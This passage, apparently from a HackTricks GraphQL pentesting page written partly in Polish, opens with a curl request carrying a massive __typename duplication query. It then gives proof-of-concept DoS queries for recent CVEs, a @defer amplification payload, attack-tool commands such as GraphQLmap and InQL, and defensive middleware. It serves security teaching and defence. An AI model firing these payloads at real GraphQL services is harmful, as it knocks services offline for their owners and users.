-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'
```
## Najnowsze podatności (2023-2025)

> Ekosystem GraphQL rozwija się bardzo szybko; w ciągu ostatnich dwóch lat ujawniono kilka krytycznych problemów w najczęściej używanych bibliotekach serwerowych. Gdy znajdziesz endpoint GraphQL, warto zidentyfikować silnik (zob. **graphw00f**) i porównać uruchomioną wersję z poniższymi podatnościami.

### CVE-2024-47614 – `async-graphql` directive-overload DoS (Rust)
* Affected: async-graphql < **7.0.10** (Rust)
* Root cause: no limit on **duplicated directives** (e.g. thousands of `@include`) which are expanded into an exponential number of execution nodes.
* Impact: a single HTTP request can exhaust CPU/RAM and crash the service.
* Fix/mitigation: upgrade ≥ 7.0.10 or call `SchemaBuilder.limit_directives()`; alternatively filter requests with a WAF rule such as `"@include.*@include.*@include"`.
```graphql
# PoC – repeat @include X times
query overload {
__typename @include(if:true) @include(if:true) @include(if:true)
}
```
### CVE-2024-40094 – `graphql-java` ENF omijanie limitów głębokości/złożoności
* Affected: graphql-java < 19.11, 20.0-20.8, 21.0-21.4
* Root cause: **ExecutableNormalizedFields** nie były uwzględniane przez instrumentację `MaxQueryDepth` / `MaxQueryComplexity`. Rekurencyjne fragmenty w związku z tym omijały wszystkie limity.
* Impact: DoS bez uwierzytelnienia wobec stosów Java, które osadzają graphql-java (Spring Boot, Netflix DGS, Atlassian products…).
```graphql
fragment A on Query { ...B }
fragment B on Query { ...A }
query { ...A }
```
### CVE-2023-23684 – WPGraphQL SSRF to RCE chain
* Dotyczy: WPGraphQL ≤ 1.14.5 (WordPress plugin).
* Przyczyna: mutacja `createMediaItem` akceptowała attacker-controlled **`filePath` URLs`**, umożliwiając dostęp do sieci wewnętrznej i zapisywanie plików.
* Wpływ: authenticated Editors/Authors mogli dotrzeć do endpointów metadanych lub zapisać pliki PHP w celu remote code execution.

---

## Incremental delivery abuse: `@defer` / `@stream`
Since 2023 most major servers (Apollo 4, GraphQL-Java 20+, HotChocolate 13) implemented the **incremental delivery** directives defined by the GraphQL-over-HTTP WG. Every deferred patch is sent as a **separate chunk**, so the total response size becomes *N + 1* (envelope + patches). A query that contains thousands of tiny deferred fields therefore produces a large response while costing the attacker only one request – a classical **amplification DoS** and a way to bypass body-size WAF rules that only inspect the first chunk. WG members themselves flagged the risk.

Example payload generating 2 000 patches:
```graphql
query abuse {
% for i in range(0,2000):
f{{i}}: __typename @defer
% endfor
}
```
Środki zaradcze: wyłączyć `@defer/@stream` w produkcji lub wymusić `max_patches`, skumulowane `max_bytes` oraz czas wykonania. Biblioteki takie jak **graphql-armor** (patrz niżej) już wymuszają rozsądne wartości domyślne.

---

## Middleware defensywne (2024+)

| Projekt | Uwagi |
|---|---|
| **graphql-armor** | Middleware walidacyjny Node/TypeScript opublikowany przez Escape Tech. Implementuje plug-and-play limity dla głębokości zapytań, liczby aliasów/pól/dyrektyw, tokenów i kosztu; kompatybilny z Apollo Server, GraphQL Yoga/Envelop, Helix, itd. |

Szybki start:
```ts
import { protect } from '@escape.tech/graphql-armor';
import { applyMiddleware } from 'graphql-middleware';

const protectedSchema = applyMiddleware(schema, ...protect());
```
`graphql-armor` będzie teraz blokować zbyt głębokie, złożone lub zawierające dużo dyrektyw zapytania, chroniąc przed wymienionymi powyżej CVE.

---


## Tools

### Vulnerability scanners

- [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Testuje typowe błędy konfiguracji endpointów GraphQL
- [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Skrypt do audytu bezpieczeństwa GraphQL z naciskiem na wykonywanie wsadowych zapytań i mutacji GraphQL.
- [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Rozpoznaje używaną implementację GraphQL
- [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Zestaw narzędzi, który można użyć do pobierania schematów i wyszukiwania wrażliwych danych, testowania autoryzacji, brute force schematów oraz znajdowania ścieżek do danego typu.
- [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Może być używany jako samodzielne narzędzie lub [Burp extension](https://github.com/doyensec/inql).
- [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Może być używany także jako klient CLI do automatyzacji ataków: `python3 graphqlmap.py -u http://example.com/graphql --inject`
- [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Narzędzie, które wypisuje różne sposoby **dostania się do danego typu w schemacie GraphQL**.
- [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Następca trybów Standalone i CLI InQL
- [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Rozszerzenie Burp lub skrypt python do zaawansowanego testowania GraphQL. _**Scanner**_ jest rdzeniem InQL v5.0 — pozwala analizować endpoint GraphQL lub lokalny plik introspekcyjnego schematu. Automatycznie generuje wszystkie możliwe zapytania i mutacje, organizując je w uporządkowany widok do analizy. Komponent _**Attacker**_ pozwala uruchamiać wsadowe ataki GraphQL, co może pomóc w obejściu słabo zaimplementowanych limitów szybkości: `python3 inql.py -t http://example.com/graphql -o output.json`
- [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Próbuje uzyskać schemat nawet przy wyłączonej introspekcji, wykorzystując bazy danych GraphQL, które podpowiedzą nazwy mutacji i parametrów.

### Scripts to exploit common vulnerabilities

- [https://github.com/reycotallo98/pentestScripts/tree/main/GraphQLDoS](https://github.com/reycotallo98/pentestScripts/tree/main/GraphQLDoS): Kolekcja skryptów do wykorzystywania podatności typu denial-of-service w podatnych środowiskach GraphQL.

### Clients

- [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Klient GUI
- [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Klient GUI

### Automatic Tests


{{#ref}}
https://graphql-dashboard.herokuapp.com/
{{#endref}}

- Video explaining AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## References

- [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
- [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
- [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)
- [**https://github.com/advisories/GHSA-5gc2-7c65-8fq8**](https://github.com/advisories/GHSA-5gc2-7c65-8fq8)
- [**https://github.com/escape-tech/graphql-armor**](https://github.com/escape-tech/graphql-armor)
- [**https://blog.doyensec.com/2025/12/02/inql-v610.html**](https://blog.doyensec.com/2025/12/02/inql-v610.html)
- [**https://github.com/nicholasaleks/graphql-threat-matrix**](https://github.com/nicholasaleks/graphql-threat-matrix)

{{#include ../../banners/hacktricks-training.md}}
